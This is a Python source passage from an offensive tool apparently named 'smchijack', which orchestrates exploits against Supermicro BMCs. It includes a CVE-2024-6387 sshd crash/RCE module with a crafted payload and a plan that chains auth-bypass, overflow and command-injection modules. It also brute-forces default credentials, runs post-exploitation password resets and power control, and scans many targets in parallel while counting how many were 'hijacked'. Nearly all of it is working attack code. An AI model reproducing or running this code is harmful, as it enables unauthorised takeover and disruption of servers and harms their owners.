def ex_6387(host, report, args):
    CVE = "CVE-2024-6387"
    TITLE = "regreSSHion sshd race"
    try:
        s = socket.create_connection((host, 22), 5)
        banner = s.recv(512).decode(errors="replace")
        s.close()
    except OSError as e:
        report.add(CVE, SKIP, TITLE, type(e).__name__)
        return None
    if not AFFECTED_SSH.search(banner) or PATCHED_SSH.search(banner):
        report.add(CVE, FAIL, TITLE, banner[:70])
        return None
    report.add(CVE, OK, TITLE, f"in range: {banner[:70]}")

    payload = (b"SSH-2.0-OpenSSH_9.5p1\r\n" + SPRAY_LEN.to_bytes(4, "big") + b"\x00"
               + b"\x32rootpublickeypublickey\x01\x00\x00\x00\x07ssh-rsa"
               + b"\x00\x00\x00\x03\x01\x00\x01" + b"A" * 4096)
    stop = threading.Event()
    ths = [threading.Thread(target=_hold, args=(host, payload, stop), daemon=True)
           for _ in range(args.connections)]
    report.log(f"holding {args.connections} connections for the grace timer", "warn")
    for t in ths:
        t.start()
    try:
        time.sleep(min(120, args.grace))
    finally:
        stop.set()
    try:
        s = socket.create_connection((host, 22), 6)
        alive = bool(s.recv(512)); s.close()
    except OSError:
        alive = False
    if not alive:
        report.add(CVE, OK, TITLE + " (crash)", "sshd died after the grace timeout")
        report.add_access("sshd crash / RCE window", CVE,
                          "root-context corruption confirmed",
                          "retry with --command for RCE (hours of grinding)")
        return {"crashed": True}
    report.add(CVE, POSSIBLE, TITLE + " (survived)", "retry with more --connections")
    return {"survived": True}


# ===========================================================================
# orchestrator
# ===========================================================================
# Ordered by determinism / reliability. Auth-needing modules run last.
PLAN = [
    ("65219",  ex_65219,  False, "unauth RAKP bypass -> session/SOL"),
    ("18449",  ex_18449,  False, "SMCRAKP fixed key -> admin session"),
    ("18450",  ex_18450,  False, "live-session cleartext injection"),
    ("36435",  ex_36435,  False, "unauth login.cgi overflow -> RCE"),
    ("33411",  ex_33411,  True,  "url_redirect traversal -> iKVM"),
    ("33412",  ex_33412,  True,  "virtual media command injection"),
    ("33413",  ex_33413,  True,  "config package RCE"),
    ("6387",   ex_6387,   False, "regreSSHion race (slow)"),
]
DEFAULT_PLAN = {"65219", "18449", "18450", "36435", "33411", "33412", "33413"}


def assess(target, args):
    host, port = target
    report = Report(host, args.quiet, not args.no_colour)
    web = Web(host, port or 443, args.timeout, args.proxy)
    report.log(f"target {host}")
    info = web.probe()
    if info.get("web"):
        report.log(f"web title={info.get('title')!r} smc={info.get('smc')} fw={info.get('fw')}")
    elif info.get("error"):
        report.log(f"web unreachable: {info['error']}", "bad")

    for c in args.creds:
        u, _, p = c.partition(":")
        if web.login(u, p):
            report.add_cred(u, p, "supplied")

    wanted = ({k for k, *_ in PLAN} if args.all
              else set(args.modules.split(",")) if args.modules
              else DEFAULT_PLAN)

    results = {}
    for key, fn, needs_auth, label in PLAN:
        if key not in wanted:
            continue
        if needs_auth and not web.creds:
            if not web.brute():
                report.add(fn.__name__, SKIP, label, "no credentials")
                continue
            report.add_cred(*web.creds, "default credential")
        report.log(f"-> {key} {label}")
        try:
            r = fn(host, report, web, args) if needs_auth else fn(host, report, args)
            if r:
                results[key] = r
                if args.stop_on_pwn and report.pwned:
                    break
        except Exception as e:                                   # noqa: BLE001
            report.log(f"{key}: {type(e).__name__}: {e}", "bad")
            if args.debug:
                traceback.print_exc()

    if not args.safe:
        _post(results, report, args)
    print("\n" + report.summary() + "\n")
    return report


def _post(results, report, args):
    sess = ((results.get("18449") or {}).get("session")
            or (results.get("65219") or {}).get("session"))
    if not sess:
        return
    try:
        if args.set_password and "18449" in results:
            uid, pw = args.set_password.split(":", 1)
            if sess.set_password(int(uid), pw.encode())[0] == 0:
                sess.enable_user(int(uid))
                report.add_cred(f"uid{uid}", pw, "password set by operator")
        if args.power and "18449" in results:
            cc, _ = sess.chassis_control(args.power)
            report.log(f"chassis control {args.power} -> cc=0x{cc:02x}",
                       "ok" if cc == 0 else "bad")
    except Exception as e:                                       # noqa: BLE001
        report.log(f"post: {e}", "bad")
    finally:
        try:
            sess.close()
        except Exception:                                        # noqa: BLE001
            pass


def self_test():
    print("[*] builders")
    print("  chain len      :", len(_chain(0x76283000, "id", GADGET1, GADGET2, SYSTEM)))
    print("  smcrakp key    :", SMCRAKP_KEY.hex())
    print("  msg checksum   :", build_msg(0x06, 0x01).hex())
    print("  ssh affected   :", bool(AFFECTED_SSH.search("SSH-2.0-OpenSSH_9.5p1")))
    print("[+] ok")


def main(argv=None):
    p = argparse.ArgumentParser(prog="smchijack",
                                description="Supermicro BMC hijack orchestrator")
    p.add_argument("targets", nargs="*")
    p.add_argument("-l", "--lhost")
    p.add_argument("-p", "--lport", type=int, default=8899)
    p.add_argument("--command")
    p.add_argument("--all", action="store_true")
    p.add_argument("--modules")
    p.add_argument("--creds", nargs="*", default=[])
    p.add_argument("--user", nargs="*", default=[])
    p.add_argument("--file", nargs="*")
    p.add_argument("--sid", type=int)
    p.add_argument("--seq", type=int)
    p.add_argument("--scan-sids", action="store_true")
    p.add_argument("--reset-admin", metavar="UID:PW")
    p.add_argument("--set-password", metavar="UID:PW")
    p.add_argument("--power", type=int)
    p.add_argument("--config-key")
    p.add_argument("--config-iv")
    p.add_argument("--config-cipher", default="cbc", choices=["cbc", "ecb"])
    p.add_argument("--libc-base", type=lambda x: int(x, 0))
    p.add_argument("--gadget1", type=lambda x: int(x, 0), default=GADGET1)
    p.add_argument("--gadget2", type=lambda x: int(x, 0), default=GADGET2)
    p.add_argument("--system", type=lambda x: int(x, 0), default=SYSTEM)
    p.add_argument("--attempts", type=int, default=150)
    p.add_argument("--connections", type=int, default=50)
    p.add_argument("--grace", type=int, default=120)
    p.add_argument("--safe", action="store_true")
    p.add_argument("--stop-on-pwn", action="store_true")
    p.add_argument("--threads", type=int, default=1)
    p.add_argument("--timeout", type=float, default=8.0)
    p.add_argument("--proxy")
    p.add_argument("--json")
    p.add_argument("--quiet", action="store_true")
    p.add_argument("--no-colour", action="store_true")
    p.add_argument("--debug", action="store_true")
    p.add_argument("--self-test", action="store_true")
    args = p.parse_args(argv)

    if args.self_test:
        self_test(); return 0
    if not args.targets:
        p.error("need a target (or --self-test)")
    if args.safe:
        args.reset_admin = None

    targets = []
    for t in args.targets:
        if os.path.isfile(t):
            targets += [(l.split(":")[0],
                         int(l.split(":")[1]) if ":" in l else 0)
                        for l in (x.strip() for x in open(t))
                        if l and not l.startswith("#")]
        else:
            targets.append((t.split(":")[0],
                            int(t.split(":")[1]) if ":" in t else 0))

    t0 = time.time()
    if args.threads > 1:
        with cf.ThreadPoolExecutor(args.threads) as ex:
            reports = list(ex.map(lambda t: assess(t, args), targets))
    else:
        reports = [assess(t, args) for t in targets]

    hit = [r for r in reports if r.pwned]
    print(f"=== {len(hit)}/{len(reports)} hijacked in {time.time() - t0:.1f}s ===")
    if args.json:
        with open(args.json, "w") as f:
            json.dump([r.as_dict() for r in reports], f, indent=2)
        print(f"json -> {args.json}")
    return 0 if hit else 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\ninterrupted")
        sys.exit(130)
